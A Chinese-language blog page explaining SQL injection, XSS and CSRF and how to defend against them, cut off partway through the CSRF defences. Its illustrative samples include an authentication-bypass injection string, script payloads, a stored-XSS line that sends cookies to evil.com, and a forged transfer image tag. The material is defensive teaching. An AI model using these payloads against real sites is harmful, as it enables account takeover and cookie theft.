<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="Keep Team">
    
    <title>
        
        Keep Theme
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/logo.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               Keep Theme
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/avatar.svg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">Keep Team</span>
                                
                                    <span class="author-badge">Lv5</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-09-10 02:43:59</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Tue May 27 2025 21:17:53 GMT+0800">2025-05-27 21:17:53</span>
            </span>
        

        

        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>常见的 Web 攻击方式主要包括以下几类，以及相应的防护措施：</p>
<hr>
<h2 id="🌐-一、SQL-注入（SQL-Injection）"><a href="#🌐-一、SQL-注入（SQL-Injection）" class="headerlink" title="🌐 一、SQL 注入（SQL Injection）"></a>🌐 一、SQL 注入（SQL Injection）</h2><p><strong>描述</strong>：攻击者在输入字段中插入恶意 SQL 语句，试图操控数据库。</p>
<p><strong>应对措施</strong>：</p>
<ul>
<li><p>使用 <strong>预处理语句（Prepared Statements）</strong> 或 <strong>ORM 框架</strong>，避免拼接 SQL。</p>
</li>
<li><p>对用户输入进行 <strong>严格过滤</strong> 和 <strong>校验</strong>。</p>
</li>
<li><p>限制数据库账户权限，只授予最小必要权限。</p>
</li>
<li><p>好的，我们来详细通俗地解释一下“SQL 注入（SQL Injection）”是什么、它有多危险，以及我们该如何防范它。</p>
<hr>
<h3 id="🌐-一、SQL-注入（SQL-Injection）是什么？"><a href="#🌐-一、SQL-注入（SQL-Injection）是什么？" class="headerlink" title="🌐 一、SQL 注入（SQL Injection）是什么？"></a>🌐 一、SQL 注入（SQL Injection）是什么？</h3><p><strong>SQL 注入</strong>是一种非常常见也非常危险的<strong>网络攻击方式</strong>，攻击者可以通过在用户输入的内容中“夹带”一些<strong>恶意 SQL 代码</strong>，骗服务器去执行本不该执行的数据库操作。</p>
<h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h4><p>假设网站有一个登录功能，后端用的是像下面这样的代码（不安全）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;用户输入的用户名&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;用户输入的密码&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>攻击者如果在“用户名”里输入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这条语句就会变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;...&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>因为 <code>&#39;1&#39;=&#39;1&#39;</code> 永远为真，所以这个语句就<strong>绕过了密码验证</strong>，让攻击者直接登录成功了！</p>
<hr>
<h3 id="🔥-SQL-注入的危害有哪些？"><a href="#🔥-SQL-注入的危害有哪些？" class="headerlink" title="🔥 SQL 注入的危害有哪些？"></a>🔥 SQL 注入的危害有哪些？</h3><ul>
<li><p><strong>绕过登录认证</strong>，直接进入后台管理系统</p>
</li>
<li><p><strong>窃取敏感数据</strong>（用户信息、密码、信用卡等）</p>
</li>
<li><p><strong>删除数据库表</strong>或篡改数据</p>
</li>
<li><p><strong>远程执行命令</strong>（严重时甚至能控制整个服务器）</p>
</li>
</ul>
<hr>
<h3 id="🛡-如何防止-SQL-注入？（详细解释）"><a href="#🛡-如何防止-SQL-注入？（详细解释）" class="headerlink" title="🛡 如何防止 SQL 注入？（详细解释）"></a>🛡 如何防止 SQL 注入？（详细解释）</h3><hr>
<h4 id="✅-1-使用预处理语句（Prepared-Statements）"><a href="#✅-1-使用预处理语句（Prepared-Statements）" class="headerlink" title="✅ 1. 使用预处理语句（Prepared Statements）"></a>✅ 1. 使用预处理语句（Prepared Statements）</h4><p>这是最根本、最有效的方法。</p>
<p>预处理语句把 SQL 和用户输入<strong>分开处理</strong>，不管用户输入多恶意，它都只会被当作“值”而不是“代码”。</p>
<p>比如使用 Java 的 JDBC：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line">stmt.setString(<span class="number">1</span>, username);</span><br><span class="line">stmt.setString(<span class="number">2</span>, password);</span><br></pre></td></tr></table></figure>

<p>不拼接字符串，就不会被注入。</p>
<hr>
<h4 id="✅-2-使用-ORM-框架"><a href="#✅-2-使用-ORM-框架" class="headerlink" title="✅ 2. 使用 ORM 框架"></a>✅ 2. 使用 ORM 框架</h4><p>ORM（对象关系映射）工具，如：</p>
<ul>
<li><p>Java 的 Hibernate</p>
</li>
<li><p>Python 的 SQLAlchemy 或 Django ORM</p>
</li>
<li><p>PHP 的 Laravel Eloquent</p>
</li>
</ul>
<p>它们默认内部使用了预处理语句，大大减少 SQL 注入风险。</p>
<hr>
<h4 id="✅-3-对用户输入做过滤和校验"><a href="#✅-3-对用户输入做过滤和校验" class="headerlink" title="✅ 3. 对用户输入做过滤和校验"></a>✅ 3. 对用户输入做过滤和校验</h4><p>虽然不能<strong>单靠</strong>这个方式，但作为<strong>辅助防御</strong>很重要：</p>
<ul>
<li><p>检查输入的长度、格式、字符类型</p>
</li>
<li><p>拒绝不符合预期的输入（比如只接受邮箱地址、数字等）</p>
</li>
</ul>
<p>比如限制用户名只能是字母数字：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[a-zA-Z0-9_]+$&quot;</span>, username):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;用户名格式不合法&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="✅-4-数据库最小权限原则"><a href="#✅-4-数据库最小权限原则" class="headerlink" title="✅ 4. 数据库最小权限原则"></a>✅ 4. 数据库最小权限原则</h4><p><strong>不要给网站的数据库账户太高权限</strong>！</p>
<p>举例：</p>
<ul>
<li><p>只给“读取数据”的权限，不给“删除、修改表结构”等权限</p>
</li>
<li><p>避免用 root 用户连接数据库</p>
</li>
</ul>
<p>即使发生了 SQL 注入，也能<strong>把伤害降到最低</strong>。</p>
<hr>
<h4 id="✅-5-使用-Web-应用防火墙（WAF）"><a href="#✅-5-使用-Web-应用防火墙（WAF）" class="headerlink" title="✅ 5. 使用 Web 应用防火墙（WAF）"></a>✅ 5. 使用 Web 应用防火墙（WAF）</h4><p>WAF 可以在网络层识别和拦截一些明显的攻击行为，比如：</p>
<ul>
<li><p>用户输入中含有危险 SQL 关键字（如 <code>SELECT</code>、<code>DROP</code>、<code>OR 1=1</code> 等）</p>
</li>
<li><p>请求行为异常（如频繁尝试 SQL 注入）</p>
</li>
</ul>
<p>常见 WAF：</p>
<ul>
<li><p>云 WAF（如阿里云、腾讯云）</p>
</li>
<li><p>开源 WAF（如 ModSecurity）</p>
</li>
</ul>
<p>虽然不能替代程序内的安全编码，但可以作为<strong>额外的一层防线</strong>。</p>
<hr>
<h3 id="✅-总结"><a href="#✅-总结" class="headerlink" title="✅ 总结"></a>✅ 总结</h3><table>
<thead>
<tr>
<th>方法</th>
<th>作用</th>
<th>推荐程度</th>
</tr>
</thead>
<tbody><tr>
<td>预处理语句</td>
<td>杜绝 SQL 注入根本问题</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>ORM 框架</td>
<td>自动安全封装</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>输入校验</td>
<td>辅助防御</td>
<td>⭐⭐⭐</td>
</tr>
<tr>
<td>数据库权限限制</td>
<td>降低攻击后果</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>Web 防火墙 WAF</td>
<td>网络层防御</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<p>如果你是开发者，<strong>预处理语句是你最该掌握和使用的方式</strong>，它可以让你写出不容易出错的、安全的代码。</p>
</li>
</ul>
<hr>
<p>好的，我们来<strong>通俗详细讲解一下“跨站脚本攻击（XSS，Cross-Site Scripting）”</strong>。</p>
<hr>
<h2 id="🔓-二、跨站脚本攻击（XSS）是什么？"><a href="#🔓-二、跨站脚本攻击（XSS）是什么？" class="headerlink" title="🔓 二、跨站脚本攻击（XSS）是什么？"></a>🔓 二、跨站脚本攻击（XSS）是什么？</h2><p><strong>跨站脚本攻击（XSS）</strong>是一种攻击方式，<strong>攻击者把恶意 JavaScript 代码注入到网页中</strong>，一旦别的用户打开这个网页，代码就会在他们的浏览器里<strong>偷偷执行</strong>，从而达到：</p>
<ul>
<li><p>窃取用户信息（如 Cookie、Token）</p>
</li>
<li><p>伪造用户行为（比如假装点击按钮）</p>
</li>
<li><p>弹出钓鱼窗口骗取用户输入账号密码</p>
</li>
</ul>
<hr>
<h2 id="📦-举个直观的例子"><a href="#📦-举个直观的例子" class="headerlink" title="📦 举个直观的例子"></a>📦 举个直观的例子</h2><p>假设你的网站有一个评论功能，用户发表评论后会被显示出来。如果你直接把用户的评论内容插到 HTML 里，像这样：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>评论内容：&lt;?= $_GET[&#x27;comment&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者输入的评论是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;你中招了&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那浏览页面的用户就会看到一个弹窗。<strong>这个脚本在别人浏览器里执行了！</strong></p>
<hr>
<h2 id="🧨-XSS-的三种类型（通俗解释）"><a href="#🧨-XSS-的三种类型（通俗解释）" class="headerlink" title="🧨 XSS 的三种类型（通俗解释）"></a>🧨 XSS 的三种类型（通俗解释）</h2><h3 id="1️⃣-存储型-XSS（Stored-XSS）"><a href="#1️⃣-存储型-XSS（Stored-XSS）" class="headerlink" title="1️⃣ 存储型 XSS（Stored XSS）"></a>1️⃣ 存储型 XSS（Stored XSS）</h3><p><strong>攻击代码被“存储”在服务器上了</strong>，比如存在数据库里，每次有用户访问页面时都会被加载并执行。</p>
<p>📌 举例：</p>
<p>攻击者发了一个恶意评论，内容是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://evil.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>每个用户浏览这个评论时，都会把自己的 Cookie 发送给攻击者！</p>
<hr>
<h3 id="2️⃣-反射型-XSS（Reflected-XSS）"><a href="#2️⃣-反射型-XSS（Reflected-XSS）" class="headerlink" title="2️⃣ 反射型 XSS（Reflected XSS）"></a>2️⃣ 反射型 XSS（Reflected XSS）</h3><p><strong>攻击代码通过 URL 参数传递</strong>，页面直接把参数“原样输出”，就中招了。</p>
<p>📌 举例：</p>
<p>某个搜索页面：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>你搜索的是：&lt;?= $_GET[&#x27;q&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者伪造一个链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>用户点了这个链接，就执行了脚本。</p>
<hr>
<h3 id="3️⃣-DOM-型-XSS"><a href="#3️⃣-DOM-型-XSS" class="headerlink" title="3️⃣ DOM 型 XSS"></a>3️⃣ DOM 型 XSS</h3><p>攻击代码不是由服务器响应注入的，而是<strong>由前端 JavaScript 操作 DOM 时引起的</strong>。</p>
<p>📌 举例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 URL 中取数据写入页面</span></span><br><span class="line"><span class="keyword">let</span> keyword = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;result&quot;</span>).<span class="property">innerHTML</span> = keyword;</span><br></pre></td></tr></table></figure>

<p>如果 URL 是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/#&lt;script&gt;alert(&#x27;DOM XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>就会执行恶意脚本。</p>
<hr>
<h2 id="🛡-如何防御-XSS？"><a href="#🛡-如何防御-XSS？" class="headerlink" title="🛡 如何防御 XSS？"></a>🛡 如何防御 XSS？</h2><hr>
<h3 id="✅-1-对用户输入进行-HTML-编码（非常关键！）"><a href="#✅-1-对用户输入进行-HTML-编码（非常关键！）" class="headerlink" title="✅ 1. 对用户输入进行 HTML 编码（非常关键！）"></a>✅ 1. 对用户输入进行 HTML 编码（非常关键！）</h3><p>防止脚本标签被当作 HTML 执行。</p>
<p>例如 PHP 中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$userInput</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>把 <code>&lt;script&gt;</code> 变成 <code>&amp;lt;script&amp;gt;</code>，就不会执行了。</p>
<hr>
<h3 id="✅-2-使用可信的前端模板引擎（自动做了防护）"><a href="#✅-2-使用可信的前端模板引擎（自动做了防护）" class="headerlink" title="✅ 2. 使用可信的前端模板引擎（自动做了防护）"></a>✅ 2. 使用可信的前端模板引擎（自动做了防护）</h3><p>如：</p>
<ul>
<li><p>React、Vue、Angular 都<strong>默认做了 HTML 编码</strong></p>
</li>
<li><p>在 React 中写：</p>
</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;userComment&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>不管用户Comment里写了什么，都<strong>不会被执行</strong>，而是安全地显示成文本。</p>
<hr>
<h3 id="✅-3-使用-Content-Security-Policy（CSP）"><a href="#✅-3-使用-Content-Security-Policy（CSP）" class="headerlink" title="✅ 3. 使用 Content Security Policy（CSP）"></a>✅ 3. 使用 Content Security Policy（CSP）</h3><p>CSP 是浏览器的一种“安全设置”，可以防止页面执行外部或内联脚本。</p>
<p>📌 举例，在 HTTP 响应头加上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<p>意思是：只能执行本站脚本，<strong>禁止加载外部 JS、禁止内联 JS</strong>。</p>
<hr>
<h3 id="✅-4-设置安全-Cookie-属性"><a href="#✅-4-设置安全-Cookie-属性" class="headerlink" title="✅ 4. 设置安全 Cookie 属性"></a>✅ 4. 设置安全 Cookie 属性</h3><p>可以防止攻击者窃取用户 Cookie：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>HttpOnly</code></td>
<td>禁止 JavaScript 访问 Cookie（即使 XSS 也拿不到）</td>
</tr>
<tr>
<td><code>Secure</code></td>
<td>只通过 HTTPS 传输 Cookie</td>
</tr>
<tr>
<td><code>SameSite=Strict</code></td>
<td>限制跨站请求时携带 Cookie，防止伪造请求</td>
</tr>
</tbody></table>
<hr>
<h2 id="✅-总结一下"><a href="#✅-总结一下" class="headerlink" title="✅ 总结一下"></a>✅ 总结一下</h2><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
<th>危险程度</th>
</tr>
</thead>
<tbody><tr>
<td>存储型</td>
<td>注入脚本存入数据库，对所有用户生效</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>反射型</td>
<td>攻击代码在 URL 中，诱导点击生效</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>DOM 型</td>
<td>前端 JS 操作 DOM 时引入漏洞</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>防御方式</th>
<th>原理</th>
<th>推荐指数</th>
</tr>
</thead>
<tbody><tr>
<td>HTML 编码</td>
<td>把 <code>&lt;script&gt;</code> 变成文本显示</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>前端模板引擎</td>
<td>自动处理 XSS 问题</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>CSP</td>
<td>限制 JS 执行来源</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>Cookie 安全属性</td>
<td>即使 XSS 成功也保护数据</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<p>如果你的网站允许用户输入并显示内容，比如评论、昵称、文章标题等，一定要做好 XSS 防护。</p>
<hr>
<p>好的，我们来<strong>详细通俗地解释“跨站请求伪造（CSRF，Cross-Site Request Forgery）”</strong>，让你彻底明白它是怎么回事、有什么危害、怎么防御。</p>
<hr>
<h2 id="📦-三、跨站请求伪造（CSRF）是什么？"><a href="#📦-三、跨站请求伪造（CSRF）是什么？" class="headerlink" title="📦 三、跨站请求伪造（CSRF）是什么？"></a>📦 三、跨站请求伪造（CSRF）是什么？</h2><p><strong>CSRF（Cross-Site Request Forgery）</strong>叫做“跨站请求伪造”。</p>
<p>一句话解释就是：</p>
<blockquote>
<p><strong>攻击者诱导你在已登录状态下，偷偷帮他完成一件事（比如转账、改密码）！</strong></p>
</blockquote>
<p>你“被利用”了，但你并不知道！</p>
<hr>
<h2 id="🧠-举个例子让你马上明白："><a href="#🧠-举个例子让你马上明白：" class="headerlink" title="🧠 举个例子让你马上明白："></a>🧠 举个例子让你马上明白：</h2><p>你登录了银行网站 <code>bank.com</code>，浏览器存着你的登录 Cookie。</p>
<p>攻击者诱导你点了一个链接，比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>   <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然你访问的是别的网站（比如攻击者自己搭的假新闻网站），但是浏览器<strong>仍然会自动带上你在 bank.com 的 Cookie</strong>，银行后台就以为是你自己发起的转账请求！</p>
<p><strong>你就被骗帮他转账了！</strong></p>
<hr>
<h2 id="🚨-为什么-CSRF-危险？"><a href="#🚨-为什么-CSRF-危险？" class="headerlink" title="🚨 为什么 CSRF 危险？"></a>🚨 为什么 CSRF 危险？</h2><p>因为它具备以下特征：</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>✅ 自动带 Cookie</td>
<td>浏览器自动附带你在目标站点的登录信息</td>
</tr>
<tr>
<td>✅ 用户不知情</td>
<td>不需要你点击“提交”，也可以隐蔽执行</td>
</tr>
<tr>
<td>✅ 破坏力强</td>
<td>可以伪造操作：改密码、删账号、发帖子、转账</td>
</tr>
</tbody></table>
<hr>
<h2 id="🛡-如何防御-CSRF？"><a href="#🛡-如何防御-CSRF？" class="headerlink" title="🛡 如何防御 CSRF？"></a>🛡 如何防御 CSRF？</h2><hr>
<h3 id="✅-1-使用-CSRF-Token"><a href="#✅-1-使用-CSRF-Token" class="headerlink" title="✅ 1. 使用 CSRF Token"></a>✅ 1. 使用 <strong>CSRF Token</strong></h3><p>这是最主流的防御方式。</p>
<p>每次用户加载页面时，服务器生成一个<strong>随机字符串（Token）</strong>，放到页面的表单中：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;随机值123456&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务器接收到请求后，会验证这个 Token 是否正确。</p>
<p><strong>攻击者无法获取这个 Token</strong>，所以伪造请求时<strong>缺少合法令牌，操作会被拦截！</strong></p>
<p>📌 常见框架都内置支持：</p>
<ul>
<li><p>Django：<code>&#123;% csrf_token %&#125;</code></p>
</li>
<li><p>Laravel：<code>@csrf</code></p>
</li>
<li><p>Spring：<code>CsrfToken</code>自动注入</p>
</li>
</ul>
<hr>
<h3 id="✅-2-设置-Cookie-的-SameSite-属性"><a href="#✅-2-设置-Cookie-的-SameSite-属性" class="headerlink" title="✅ 2. 设置 Cookie 的 SameSite 属性"></a>✅ 2. 设置 Cookie 的 <code>SameSite</code> 属性</h3><p>这个属性控制 Cookie 在“跨站请求”中是否可以发送。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionid=abc123; SameSite=Strict; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>Strict</code></td>
<td>完全禁止第三方网站带 Cookie</td>
</tr>
<tr>
<td><code>Lax</code></td>
<td>常见操作（GET 请求）带 Cookie，但 POST 会被拦截（推荐）</td>
</tr>
<tr>
<td><code>None</code></td>
<td>跨站请求也带 Cookie，必须同时设置 <code>Secure</code></td>
</tr>
</tbody></table>
<p>这可以直接阻止很多 CSRF 攻击。</p>
<hr>
<h3 id="✅-3-敏感操作添加-二次确认"><a href="#✅-3-敏感操作添加-二次确认" class="headerlink" title="✅ 3. 敏感操作添加 二次确认"></a>✅ 3. 敏感操作添加 <strong>二次确认</strong></h3><p>即使攻击者伪造请求，也拦不住用户操作“后一步”。</p>
<p>常见手段：</p>
<ul>
<li><p><strong>弹出确认框</strong>：“你确认要转账吗？”</p>
</li>
<li><p><strong>图形验证码</strong>：让用户点一下</p>
</li>
